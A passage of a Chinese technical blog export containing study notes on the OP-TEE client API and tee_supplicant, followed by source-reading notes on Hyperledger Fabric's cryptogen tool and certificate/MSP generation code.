class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置共享内存的大小和标志</span></span><br><span class=\"line\">sharedMem.size = <span class=\"number\">4096</span>;  <span class=\"comment\">// 分配 4KB 内存</span></span><br><span class=\"line\">sharedMem.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;  <span class=\"comment\">// 该共享内存用于双向传递数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 分配共享内存</span></span><br><span class=\"line\">res = TEEC_AllocateSharedMemory(&amp;ctx, &amp;sharedMem);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (res != TEEC_SUCCESS) {</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Failed to allocate shared memory: 0x%x\\n\"</span>, res);</span><br><span class=\"line\">    TEEC_FinalizeContext(&amp;ctx);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 现在可以使用 sharedMem.buffer 指向的内存区域</span></span><br><span class=\"line\"><span class=\"comment\">// 执行其他操作，如通过 TEEC_InvokeCommand 传递数据...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 完成后释放共享内存</span></span><br><span class=\"line\">TEEC_ReleaseSharedMemory(&amp;sharedMem);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 最终关闭 TEE 上下文</span></span><br><span class=\"line\">TEEC_FinalizeContext(&amp;ctx);</span><br></pre></td></tr></table></figure>\n<h5 id=\"对比-register-和-allocate\">对比 Register 和 Allocate</h5>\n<ul>\n<li><p><strong>Register</strong>：将一块已经分配好了的内存空间，<strong>注册</strong>为共享内存。例如在\nCA 中有一个动态分配空间（即使用 <code>malloc</code>\n）的数组，可以直接将这个数组注册为共享内存，供 TA 使用。</p>\n<ul>\n<li><p>当有些内存空间已经通过其他方式分配了，（例如与设备共享的内存、通过\nDMA 机制获取的内存块等），就可以直接通过注册共享内存让 TA\n访问这部分内存空间。</p></li>\n<li><p>当执行 Release\n时，只会取消内存空间的共享，需要后续进行手动释放。</p></li>\n<li><p>总结：将已有的空间共享给 TA，所以叫注册。</p></li>\n</ul></li>\n<li><p><strong>Allocate</strong>：不需要已分配的内存空间，这个函数里包含了创建空间的过程。</p>\n<ul>\n<li>一个简化的共享内存管理。我只是想共享一块内存，这个内存并没有其他含义。</li>\n<li>当执行 Release 时，会自动释放内存空间。（更简便）</li>\n</ul></li>\n</ul>\n<h4 id=\"teec_releasesharedmemory\">TEEC_ReleaseSharedMemory</h4>\n<p>释放共享内存空间。</p>\n<h4 id=\"总结\">总结</h4>\n<ul>\n<li><p>初始化、释放 <em>Context</em></p></li>\n<li><p>打开、关闭 <em>Session</em></p></li>\n<li><p>执行、终止 <em>Command</em></p></li>\n<li><p>注册、分配、释放 <em>共享内存</em></p>\n<ul>\n<li>注册额外有一个共享文件</li>\n</ul></li>\n</ul>\n<h3 id=\"调用-libteec-的流程\">7.1.2 调用 libteec 的流程</h3>\n<figure>\n<img src=\"/blockchain/OP-TEE/image-20241015211908095.png\" alt=\"image-20241015211908095\">\n<figcaption aria-hidden=\"true\">image-20241015211908095</figcaption>\n</figure>\n<h2 id=\"tee_supplicant\">7.2 tee_supplicant</h2>\n<blockquote>\n<p><code>tee_supplicant</code> 是 OP-TEE\n中的一个用户态进程，用于在普通世界（Normal World）和安全世界（Secure\nWorld）之间提供辅助功能。它负责处理 TEE\n中某些操作中需要普通世界支持的请求。简而言之，<code>tee_supplicant</code>\n是普通世界中的辅助守护进程，为 TEE\n提供支持，特别是文件系统和共享内存等功能。</p>\n<h3 id=\"主要功能和作用\">主要功能和作用：</h3>\n<p>在 OP-TEE 体系中，<code>tee_supplicant</code>\n的主要任务是处理由安全世界发出的某些特定类型的请求，例如： 1.\n<strong>文件系统访问</strong>：TA（Trusted\nApplication，信任应用程序）可能需要访问文件系统，而安全世界是隔离的，不能直接操作普通世界的文件系统。因此，TA\n需要通过 <code>tee_supplicant</code> 来进行文件 I/O 操作。 2.\n<strong>共享内存分配</strong>：在某些场景下，安全世界可能需要更多的共享内存区域，而这些内存需要通过普通世界进行分配和管理，<code>tee_supplicant</code>\n也负责这类请求。 3.\n<strong>加密算法支持</strong>：有些信任应用程序需要依赖普通世界中提供的加密支持，比如\nOpenSSL 之类的库，<code>tee_supplicant</code> 充当桥梁来调用这些服务。\n4. <strong>启动和管理 TEE 功能</strong>：<code>tee_supplicant</code>\n在系统启动时运行，确保 TEE 相关资源和服务准备就绪。</p>\n<h3 id=\"tee_supplicant-的架构图\">tee_supplicant 的架构图：</h3>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">+-------------------+      +----------------------+      +---------------------+</span><br><span class=\"line\">|   Secure World    |      |  Normal World        |      |  Linux Filesystem   |</span><br><span class=\"line\">|                   |      |                      |      |                     |</span><br><span class=\"line\">| +--------------+  |      |  +----------------+  |      |  +---------------+  |</span><br><span class=\"line\">| |  Trusted     |  |&lt;----&gt;|  | tee_supplicant |  |&lt;----&gt;|  | Files and Data|  |</span><br><span class=\"line\">| |  Application |  |      |  +----------------+  |      |  +---------------+  |</span><br><span class=\"line\">| +--------------+  |      |                      |      |                     |</span><br><span class=\"line\">|                   |      |                      |      |                     |</span><br><span class=\"line\">+-------------------+      +----------------------+      +---------------------+</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>即，当 TA 需要用到普通世界中的数据、接口等功能时，TEE 就向\n<code>tee_supplicant</code> 发送请求 (tee 乞求) 。然后由普通世界的\n<code>tee_supplicant</code>\n处理请求，执行类似获取数据、访问文件、调用函数等操作。</p>\n<figure>\n<img src=\"/blockchain/OP-TEE/image-20241015212813158.png\" alt=\"image-20241015212813158\">\n<figcaption aria-hidden=\"true\">image-20241015212813158</figcaption>\n</figure>\n<p>TA 能向 <code>tee_supplicant</code> 发送的请求有：</p>\n<ul>\n<li>从文件系统中读取TA的镜像保存在共享内存中<br>\n</li>\n<li>对文件系统中的节点进行读/写/打开/关闭/移除等操作<br>\n</li>\n<li>执行RPMB（EMMC中的RPMB分区）相关操作<br>\n</li>\n<li>分配共享内存<br>\n</li>\n<li>释放共享内存<br>\n</li>\n<li>处理gprof请求<br>\n</li>\n<li>执行网络socket请求</li>\n</ul>\n<h1 id=\"ree-侧的-op-tee-驱动\">8 REE 侧的 OP-TEE 驱动</h1>\n","categories":["笔记"],"tags":["TrustZone","OP-TEE"]},{"title":"Hyperledger Fabric 源码精读（1）","url":"/fabric/fabric%E6%BA%90%E7%A0%81%E7%B2%BE%E8%AF%BB%20(1)/","content":"<ul>\n<li><p>开坑，学习 Fabric 的源码。</p></li>\n<li><p>思路是根据 <code>fabric-sample</code> 的\n<code>test-network</code>\n中的脚本，一行行分析。遇到里面使用的指令，看源码如何实现。</p></li>\n<li><p>下面内容非常混乱，写的毫无逻辑，之后有空重新整理一遍。</p></li>\n<li><p>一口气写完太长了，typora里会卡了，分章节发。</p></li>\n<li><p>学习笔记，不保证内容正确性。</p></li>\n</ul>\n<span id=\"more\"></span>\n<h1 id=\"文件结构概览\">0 文件结构概览</h1>\n<ol type=\"1\">\n<li><p>ccaas_builder:\n包含构建链代码即服务（CCaaS）相关命令的代码。</p></li>\n<li><p>ci:\n包含持续集成（CI）相关的脚本，用于自动化测试和构建过程。</p></li>\n<li><p><strong>cmd</strong>:\n包含Fabric项目中各种命令行工具的实现代码，如<code>configtxgen</code>、<code>cryptogen</code>、<code>peer</code>等。</p></li>\n<li><p><strong>common</strong>:\n包含Fabric项目中各模块通用的功能模块，如加密、配置、错误处理等。</p></li>\n<li><p><strong>core</strong>:\n实现了Fabric的核心功能，如ACL管理、链代码生命周期、提交人、账本管理、策略管理等。</p></li>\n<li><p><strong>discovery</strong>:\n处理Fabric中的服务发现功能，包括客户端、命令行工具、背书策略等。</p></li>\n<li><p>docs: 文档生成工具及相关资源文件。</p></li>\n<li><p><strong>gossip</strong>:\n包含实现Fabric中gossip协议的相关代码，用于网络节点间的数据传播与共识。</p></li>\n<li><p>images:\n包含Fabric各组件的Docker镜像构建文件，如<code>peer</code>、<code>orderer</code>等。</p></li>\n<li><p>integration:\n包含集成测试相关的代码，用于验证Fabric各组件间的相互作用。</p></li>\n<li><p><strong>internal</strong>:\n包含Fabric内部使用的一些模块和工具，如配置生成器、加密工具等。</p></li>\n<li><p><strong>msp</strong>:\n包含成员服务提供者（MSP）相关的代码，用于管理组织的身份和证书。</p></li>\n<li><p><strong>orderer</strong>:\n包含排序服务节点（Orderer）相关的功能模块，如共识机制实现、样例客户端等。</p></li>\n<li><p>pkg:\n包含一些通用的包和工具，如状态数据和交易处理相关的代码。</p></li>\n<li><p>protoutil: 包含与Protobuf相关的工具和测试文件。</p></li>\n<li><p>release_notes: 包含项目的发行说明，记录版本更新和变化。</p></li>\n<li><p>sampleconfig:\n包含一些样例配置文件，如MSP配置，用于演示和测试。</p></li>\n<li><p>scripts: 包含各种脚本文件，用于辅助项目的构建和部署。</p></li>\n<li><p>swagger:\n用于生成Swagger文档的文件，Swagger用于API文档的生成。</p></li>\n<li><p>tools: 包含一些额外的工具和实用程序。</p></li>\n<li><p>vagrant: 包含用于创建虚拟开发环境的Vagrant配置文件。</p></li>\n<li><p>vendor: 包含Fabric项目依赖的第三方库和包。</p></li>\n</ol>\n<h1 id=\"networkup\">1 networkUp</h1>\n<h2 id=\"证书生成与msp\">1.1 证书生成与MSP</h2>\n<p>启动网络首先会执行证书生成。</p>\n<p>fabric 提供三种证书生成的工具：<code>cryptogen</code>\n<code>cfssl</code> <code>Fabric CA</code>。这里先以\n<code>cryptogen</code> 为例，后续补充 <code>Fabric CA</code>\n的实现。</p>\n<h3 id=\"cryptogen\">1.1.1 cryptogen</h3>\n<p><code>cryptogen</code> 是 fabric 提供的一个命令行工具。</p>\n<p>命令帮助：https://hyperledger-fabric.readthedocs.io/zh-cn/latest/commands/cryptogen.html</p>\n<p>它为测试提供了一种预配置网络的工具。\n通常它<strong>不应使用在生产环境中</strong>。</p>\n<p>networkUp中执行如下指令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cryptogen generate --config=./organizations/cryptogen/crypto-config-org1.yaml --output=\"organizations\"</span><br><span class=\"line\">cryptogen generate --config=./organizations/cryptogen/crypto-config-org2.yaml --output=\"organizations\"</span><br><span class=\"line\">cryptogen generate --config=./organizations/cryptogen/crypto-config-orderer.yaml --output=\"organizations\"</span><br></pre></td></tr></table></figure>\n<p><code>cryptogen generate</code>\n用于生成秘钥材料。指定两个参数，分别是配置文件和输出目录。</p>\n<p>配置文件结构如下：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"># \"OrdererOrgs\" - 管理orderer节点的组织定义</span></span><br><span class=\"line\"><span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"attr\">OrdererOrgs:</span></span><br><span class=\"line\">  <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">  <span class=\"comment\"># Orderer</span></span><br><span class=\"line\">  <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">Name:</span> <span class=\"string\">Orderer</span></span><br><span class=\"line\">    <span class=\"attr\">Domain:</span> <span class=\"string\">example.com</span></span><br><span class=\"line\">    <span class=\"attr\">EnableNodeOUs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># \"Specs\" - 完整描述请参见下面的PeerOrgs</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"attr\">Specs:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">Hostname:</span> <span class=\"string\">orderer</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"># \"PeerOrgs\" - 管理peer节点的组织定义</span></span><br><span class=\"line\"><span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"attr\">PeerOrgs:</span></span><br><span class=\"line\">  <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">  <span class=\"comment\"># Org1</span></span><br><span class=\"line\">  <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">Name:</span> <span class=\"string\">Org1</span></span><br><span class=\"line\">    <span class=\"attr\">Domain:</span> <span class=\"string\">org1.example.com</span></span><br><span class=\"line\">    <span class=\"attr\">EnableNodeOUs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># \"CA\"</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># 取消注释这个部分以启用这个组织的CA的显式定义。</span></span><br><span class=\"line\">    <span class=\"comment\"># 这个条目是一个Spec。详细信息请参见下面的\"Specs\"部分。</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># CA:</span></span><br><span class=\"line\">    <span class=\"comment\">#    Hostname: ca # 默认为ca.org1.example.com</span></span><br><span class=\"line\">    <span class=\"comment\">#    Country: US</span></span><br><span class=\"line\">    <span class=\"comment\">#    Province: California</span></span><br><span class=\"line\">    <span class=\"comment\">#    Locality: San Francisco</span></span><br><span class=\"line\">    <span class=\"comment\">#    OrganizationalUnit: Hyperledger Fabric</span></span><br><span class=\"line\">    <span class=\"comment\">#    StreetAddress: org的地址 # 默认为nil</span></span><br><span class=\"line\">    <span class=\"comment\">#    PostalCode: org的邮政编码 # 默认为nil</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># \"Specs\"</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># 取消注释这个部分以在配置中启用主机的显式定义。</span></span><br><span class=\"line\">    <span class=\"comment\"># 大多数用户会使用下面的Template。</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># Specs是Spec条目的数组。每个Spec条目由两个字段组成：</span></span><br><span class=\"line\">    <span class=\"comment\">#   - Hostname:   (必需) 期望的主机名，不包括域名部分。</span></span><br><span class=\"line\">    <span class=\"comment\">#   - CommonName: (可选) 指定CN的模板或显式覆盖。</span></span><br><span class=\"line\">    <span class=\"comment\">#                 默认情况下，这是一个模板：</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\">#                              \"{{.Hostname}}.{{.Domain}}\"</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\">#                 它的值分别从Spec.Hostname和Org.Domain中获取。</span></span><br><span class=\"line\">    <span class=\"comment\">#   - SANS:       (可选) 指定将在生成的x509中设置的一个或多个主题备用名称。</span></span><br><span class=\"line\">    <span class=\"comment\">#                 接受模板变量{{.Hostname}}, {{.Domain}}, {{.CommonName}}。</span></span><br><span class=\"line\">    <span class=\"comment\">#                 这里提供的IP地址将被正确识别。其他值将被视为DNS名称。</span></span><br><span class=\"line\">    <span class=\"comment\">#                 注意：会为你创建两个隐式条目：</span></span><br><span class=\"line\">    <span class=\"comment\">#                     - {{ .CommonName }}</span></span><br><span class=\"line\">    <span class=\"comment\">#                     - {{ .Hostname }}</span></span><br><span class=\"line\">    <span class=\"comment\">#                 即：SANS里定义的域名也会被指向这个节点，证书会认为这些域名是这个节点的合法别名。</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># Specs:</span></span><br><span class=\"line\">    <span class=\"comment\">#   - Hostname: foo # 默认为\"foo.org1.example.com\"</span></span><br><span class=\"line\">    <span class=\"comment\">#     CommonName: foo27.org5.example.com # 覆盖基于主机名的上面设置的FQDN</span></span><br><span class=\"line\">    <span class=\"comment\">#     SANS:</span></span><br><span class=\"line\">    <span class=\"comment\">#       - \"bar.{{.Domain}}\"</span></span><br><span class=\"line\">    <span class=\"comment\">#       - \"altfoo.{{.Domain}}\"</span></span><br><span class=\"line\">    <span class=\"comment\">#       - \"{{.Hostname}}.org6.net\"</span></span><br><span class=\"line\">    <span class=\"comment\">#       - 172.16.10.31</span></span><br><span class=\"line\">    <span class=\"comment\">#   - Hostname: bar</span></span><br><span class=\"line\">    <span class=\"comment\">#   - Hostname: baz</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># \"Template\"</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># 允许从模板中顺序生成一个或多个主机。</span></span><br><span class=\"line\">    <span class=\"comment\"># 默认情况下，这看起来像是从0到Count-1的\"peer%d\"。</span></span><br><span class=\"line\">    <span class=\"comment\"># 你可以覆盖节点数（Count）、起始索引（Start）或用于构建名称的模板（Hostname）。</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># 注意：Template和Specs不是互斥的。你可以定义这两个部分，系统会为你创建聚合的节点。</span></span><br><span class=\"line\">    <span class=\"comment\"># 注意名称冲突</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"attr\">Template:</span></span><br><span class=\"line\">      <span class=\"attr\">Count:</span> <span class=\"number\">1</span></span><br><span class=\"line\">      <span class=\"comment\"># Start: 5</span></span><br><span class=\"line\">      <span class=\"comment\"># Hostname: {{.Prefix}}{{.Index}} # 默认</span></span><br><span class=\"line\">      <span class=\"comment\"># SANS:</span></span><br><span class=\"line\">      <span class=\"comment\">#   - \"{{.Hostname}}.alt.{{.Domain}}\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># \"Users\"</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"comment\"># Count: 除Admin外的用户账户数量</span></span><br><span class=\"line\">    <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">    <span class=\"attr\">Users:</span></span><br><span class=\"line\">      <span class=\"attr\">Count:</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">  <span class=\"comment\"># Org2: 完整规范请参见\"Org1\"</span></span><br><span class=\"line\">  <span class=\"comment\"># ---------------------------------------------------------------------------</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">Name:</span> <span class=\"string\">Org2</span></span><br><span class=\"line\">    <span class=\"attr\">Domain:</span> <span class=\"string\">org2.example.com</span></span><br><span class=\"line\">    <span class=\"attr\">EnableNodeOUs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"attr\">Template:</span></span><br><span class=\"line\">      <span class=\"attr\">Count:</span> <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"attr\">Users:</span></span><br><span class=\"line\">      <span class=\"attr\">Count:</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>执行 <code>cryptogen generate</code> 会遍历创建所有配置文件中定义的\n<code>Ordered</code> 和 <code>Peer</code>\n节点的<strong>组织</strong>。注意这里是组织，一个组织里面可以包含很多个节点。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">generate</span><span class=\"params\">()</span></span> {</span><br><span class=\"line\">\tconfig, err := getConfig() <span class=\"comment\">// 读取配置文件，反序列化成config</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\tfmt.Printf(<span class=\"string\">\"Error reading config: %s\"</span>, err)</span><br><span class=\"line\">\t\tos.Exit(<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> _, orgSpec := <span class=\"keyword\">range</span> config.PeerOrgs {</span><br><span class=\"line\">\t\terr = renderOrgSpec(&amp;orgSpec, <span class=\"string\">\"peer\"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t\tfmt.Printf(<span class=\"string\">\"Error processing peer configuration: %s\"</span>, err)</span><br><span class=\"line\">\t\t\tos.Exit(<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\tgeneratePeerOrg(*outputDir, orgSpec)</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> _, orgSpec := <span class=\"keyword\">range</span> config.OrdererOrgs {</span><br><span class=\"line\">\t\terr = renderOrgSpec(&amp;orgSpec, <span class=\"string\">\"orderer\"</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t\tfmt.Printf(<span class=\"string\">\"Error processing orderer configuration: %s\"</span>, err)</span><br><span class=\"line\">\t\t\tos.Exit(<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\tgenerateOrdererOrg(*outputDir, orgSpec)</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p><code>renderOrgSpec</code>：处理配置文件中的<code>OrgSpec</code>，完成配置文件中模板的处理。即完整定义一个组织中的所有节点。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">renderOrgSpec</span><span class=\"params\">(orgSpec *OrgSpec, prefix <span class=\"type\">string</span>)</span></span> <span class=\"type\">error</span> {</span><br><span class=\"line\">\t<span class=\"comment\">// 获取配置文件中定义的公钥算法，默认为ECDSA</span></span><br><span class=\"line\">\tpublickKeyAlg := getPublicKeyAlg(orgSpec.Template.PublicKeyAlgorithm)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 首先处理Template的配置，自动根据模板生成Specs</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i := <span class=\"number\">0</span>; i &lt; orgSpec.Template.Count; i++ {</span><br><span class=\"line\">\t\tdata := HostnameData{</span><br><span class=\"line\">\t\t\tPrefix: prefix,</span><br><span class=\"line\">\t\t\tIndex:  i + orgSpec.Template.Start,</span><br><span class=\"line\">\t\t\tDomain: orgSpec.Domain,</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 生成完整的域名</span></span><br><span class=\"line\">\t\thostname, err := parseTemplateWithDefault(orgSpec.Template.Hostname, defaultHostnameTemplate, data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tspec := NodeSpec{</span><br><span class=\"line\">\t\t\tHostname:           hostname,</span><br><span class=\"line\">\t\t\tSANS:               orgSpec.Template.SANS,</span><br><span class=\"line\">\t\t\tPublicKeyAlgorithm: publickKeyAlg,</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\torgSpec.Specs = <span class=\"built_in\">append</span>(orgSpec.Specs, spec)</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 再处理Specs中显式定义的Specs</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> idx, spec := <span class=\"keyword\">range</span> orgSpec.Specs {</span><br><span class=\"line\">\t\terr := renderNodeSpec(orgSpec.Domain, &amp;spec)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t\torgSpec.Specs[idx] = spec</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 同样处理CA节点</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(orgSpec.CA.Hostname) == <span class=\"number\">0</span> {</span><br><span class=\"line\">\t\torgSpec.CA.Hostname = <span class=\"string\">\"ca\"</span></span><br><span class=\"line\">\t}</span><br><span class=\"line\">\terr := renderNodeSpec(orgSpec.Domain, &amp;orgSpec.CA)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> err</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p><code>generatePeerOrg</code> /\n<code>generateOrderedOrg</code>：Ordered与Peer类似，区别只在于生成的nodeType是PEER还是Ordered</p>\n<ul>\n<li><p><strong>生成Signing证书</strong></p></li>\n<li><p><strong>生成CA证书</strong></p>\n<p>生成证书的通过调用ca.NewCA方法，给定地址、街道等基本信息和加密算法，自动生成私钥和公钥</p>\n<p>证书的版本是X.509</p></li>\n<li><p><strong>生成验证 MSP</strong></p>\n<p><code>GenerateVerifyingMSP</code> 函数负责生成 Hyperledger Fabric\n中验证 MSP（Membership Service\nProvider）所需的工件。以下是其功能的简要说明：</p>\n<ol type=\"1\">\n<li><p><strong>创建文件夹结构</strong>： 该函数首先通过\n<code>createFolderStructure</code> 创建所需的文件夹结构：\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">err := createFolderStructure(baseDir, <span class=\"literal\">false</span>)</span><br></pre></td></tr></table></figure></p></li>\n<li><p><strong>导出 CA 证书</strong>： 它将签名 CA 和 TLS CA\n证书导出到相应的目录： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">err = x509Export(filepath.Join(baseDir, <span class=\"string\">\"cacerts\"</span>, x509Filename(signCA.Name)), signCA.SignCert)</span><br><span class=\"line\">err = x509Export(filepath.Join(baseDir, <span class=\"string\">\"tlscacerts\"</span>, x509Filename(tlsCA.Name)), tlsCA.SignCert)</span><br></pre></td></tr></table></figure></p></li>\n<li><p><strong>生成 <code>config.yaml</code></strong>： 如果启用了\n<code>nodeOUs</code>，则生成 <code>config.yaml</code> 文件：\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> nodeOUs {</span><br><span class=\"line\">    exportConfig(baseDir, <span class=\"string\">\"cacerts/\"</span>+x509Filename(signCA.Name), <span class=\"literal\">true</span>)</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p></li>\n<li><p><strong>创建管理员证书</strong>： 如果未启用\n<code>nodeOUs</code>，则为单元测试创建一个临时的管理员证书：\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> !nodeOUs {</span><br><span class=\"line\">    ksDir := filepath.Join(baseDir, <span class=\"string\">\"keystore\"</span>)</span><br><span class=\"line\">    err = os.Mkdir(ksDir, <span class=\"number\">0o755</span>)</span><br><span class=\"line\">    <span class=\"keyword\">defer</span> os.RemoveAll(ksDir)</span><br><span class=\"line\">    priv, err := csp.GeneratePrivateKey(ksDir, keyAlg)</span><br><span class=\"line\">    _, err = signCA.SignCertificate(</span><br><span class=\"line\">        filepath.Join(baseDir, <span class=\"string\">\"admincerts\"</span>),</span><br><span class=\"line\">        signCA.Name,</span><br><span class=\"line\">        <span class=\"literal\">nil</span>,</span><br><span class=\"line\">        <span class=\"literal\">nil</span>,</span><br><span class=\"line\">        getPublicKey(priv),</span><br><span class=\"line\">        x509.KeyUsageDigitalSignature,</span><br><span class=\"line\">        []x509.ExtKeyUsage{},</span><br><span class=\"line\">    )</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<p>该函数确保所有必要的 MSP\n工件都已生成并放置在正确的目录中，从而便于设置 Hyperledger Fabric\n中的验证 MSP。</p>\n<blockquote>\n<p>MSP 的功能是什么？</p>\n<p>nodeOUs是什么？</p>\n</blockquote></li>\n<li><p><strong>生成所有 PEER 节点</strong></p>\n<p>遍历 <code>orgSpec.Specs</code> ，给每一个节点调用\n<code>msp.GenerateLocalMSP</code> 生成 MSP</p>\n<p><code>GenerateLocalMSP</code> 函数用于生成本地 MSP（Membership\nService Provider）身份和 TLS（Transport Layer\nSecurity）证书。以下是对该函数的简要解释：</p>\n<ol type=\"1\">\n<li><p><strong>创建文件夹结构</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">mspDir := 